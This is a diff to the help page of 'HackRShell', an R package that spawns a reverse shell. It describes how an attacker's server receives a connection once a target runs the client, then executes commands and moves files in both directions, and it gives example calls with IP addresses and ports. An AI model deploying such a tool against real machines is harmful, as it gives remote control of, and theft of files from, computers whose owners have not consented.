@@ -13,12 +13,12 @@ HackRShell - the R Reverse Shell
 \description{
 This program spawns a reverse shell on a target's computer. The attacker first runs the hRs.server() function on their machine, which will start the server listening for connections. Once a target runs the hRs.client() function with the corrrect address and port numbers, the target's R session will hang and the attacker should see a connection to their computer with the prompt "Shell>". From there, the attacker can enter commands and they will execute on the target's R session. See the details section for a list of valid commands. Note that commands are case-sensitive.
 
-To end the session, the attacker sends the "exit"" command
+To end the session, the attacker sends the "exit" command
 }
 \usage{
-hRs.server(host, port, secondaryPort)
+hRs.server(host, port)
 
-hRs.client(host, port, secondaryPort)
+hRs.client(host, port)
 }
 \arguments{
   \item{host}{
@@ -26,9 +26,6 @@ hRs.client(host, port, secondaryPort)
   }
   \item{port}{
     The TCP port number of the listening process on the remote server, as an integer. Defaults to 4471 as an arbitrary choice.
-  }
-  \item{secondaryPort}{
-  The TCP port number that the server will listen on to download or upload files. See the download and upload commands below. Do not make this the same value as the port argument. Defaults to 5472 as an arbitrary choice.
   }
 }
 \details{
@@ -45,9 +42,9 @@ List of Commands:
 
   (cat, type) [filename]: view the contents of [filename] as text if it is in the working directory. Will not work on files that contain non-text characters. If you wish to view the contents of these files in the terminal, see the sys command below.
 
-  download [filename]: opens a new socket connection with server port number secondaryPort and sends the file [filename] from the client to the server. This function can only download files, not directories.
+  download [filename]: sends the file [filename] from the client to the server. This function can only download files, not directories.
 
-  upload[filename]: opens a new socket connection with server port number secondaryPort and sends the file [filename] from the server to the client. This function can only upload files, not directories.
+  upload[filename]: sends the file [filename] from the server to the client. This function can only upload files, not directories.
 
   exit: end the shell session and close the socket connection.
 
@@ -67,7 +64,7 @@ Ian Roberts
 }
 \note{
 
-  In order to keep the transmissions to a single line for the readLines() function, newline characters sent from the client are encoded as the string "\%&\%" before being sent to the server for decoding. While it's not likely to come up, if a command output contains that string, it will get replaced with a newline. (Downloading and uploading files are not affected by this, as those functions use a separate socket and separate read/write functions.)
+  In order to keep the transmissions to a single line for the readLines() function, newline characters sent from the client are encoded as the string "\%&\%" before being sent to the server for decoding. While it's not likely to come up, if a command output contains that string, it will get replaced with a newline. (Downloading and uploading files are not affected by this, as those functions use separate read/write functions that don't rely on newlines.)
 
 
   Also, the command socket has a timeout of 24 hours. (Up from the R default of 1 minute.) So do not leave a reverse shell session idle for over 24 hours, or you will silently lose the connection.
@@ -80,9 +77,9 @@ hRs.server()
 
 hRs.client()
 
-hRs.server("192.168.0.1", 3343, 4454)
+hRs.server("192.168.0.1", 3343)
 
-hRs.client("192.168.0.1", 3343, 4454)
+hRs.client("192.168.0.1", 3343)
 
 hRs.server("127.0.0.1")
 
